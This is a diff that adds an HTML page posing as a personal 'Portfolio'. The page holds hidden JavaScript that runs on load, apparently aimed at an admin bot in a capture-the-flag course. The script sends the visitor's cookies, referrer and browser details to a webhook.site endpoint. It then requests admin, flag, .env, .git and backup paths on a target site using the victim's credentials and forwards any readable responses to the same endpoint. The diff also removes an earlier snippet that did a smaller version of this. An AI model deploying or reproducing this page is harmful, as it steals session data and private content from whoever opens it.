@@ -1,4 +1,67 @@
-fetch('https://cats.is-course.ru/api/user', { credentials: 'include' })
-  .then(r => r.text())
-  .then(t => fetch('https://webhook.site/...', { method: 'POST', mode: 'no-cors', body: t }))
-  .catch(e => fetch('https://webhook.site/...', { method: 'POST', mode: 'no-cors', body: 'ERR: ' + e.message }));
+<!DOCTYPE html>
+<html>
+<head><title>Portfolio</title></head>
+<body>
+<h1>Hello, Giovanni Giorgio here</h1>
+<script>
+(function() {
+  const WEBHOOK = 'https://webhook.site/5777831e-326d-43f6-83a0-de255e891b9f';
+  const TARGET = 'https://cats.is-course.ru';
+
+  function send(label, data) {
+    try {
+      fetch(WEBHOOK, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({ label, data, url: location.href, ts: new Date().toISOString() })
+      });
+    } catch(e) {}
+  }
+
+  // 1. Контекст: откуда пришёл бот, есть ли opener, какой referrer
+  send('context', {
+    referrer: document.referrer,
+    windowName: window.name,
+    historyLength: history.length,
+    origin: location.origin,
+    href: location.href,
+    cookie: document.cookie,
+    hasOpener: !!window.opener,
+    ua: navigator.userAgent
+  });
+
+  // 2. Перечисление путей с попыткой чтения через CORS
+  const paths = [
+    '/', '/admin', '/admin/', '/login', '/logout', '/dashboard',
+    '/profile', '/user', '/users', '/api', '/api/', '/api/user',
+    '/api/me', '/api/admin', '/api/flag', '/api/users', '/api/feedback',
+    '/flag', '/flag.txt', '/secret', '/secret.txt', '/robots.txt',
+    '/sitemap.xml', '/.git/HEAD', '/.git/config', '/.env',
+    '/backup', '/backup.zip', '/static/', '/css/', '/js/',
+    '/feedback', '/feedback/', '/admin/feedback', '/admin/users'
+  ];
+
+  paths.forEach(function(path) {
+    const url = TARGET + path;
+    // Сначала пробуем CORS — если сервер отдаёт Access-Control-Allow-Origin, прочитаем тело
+    fetch(url, { credentials: 'include', mode: 'cors' })
+      .then(function(r) {
+        return r.text().then(function(t) {
+          send('cors-ok', { path: path, status: r.status, body: t.slice(0, 3000) });
+        });
+      })
+      .catch(function() {
+        // CORS заблокировал — проверяем хотя бы сетевую доступность
+        fetch(url, { credentials: 'include', mode: 'no-cors' })
+          .then(function(r) {
+            send('nocors-ok', { path: path, type: r.type });
+          })
+          .catch(function(e2) {
+            send('fail', { path: path, error: e2.message });
+          });
+      });
+  });
+})();
+</script>
+</body>
+</html>
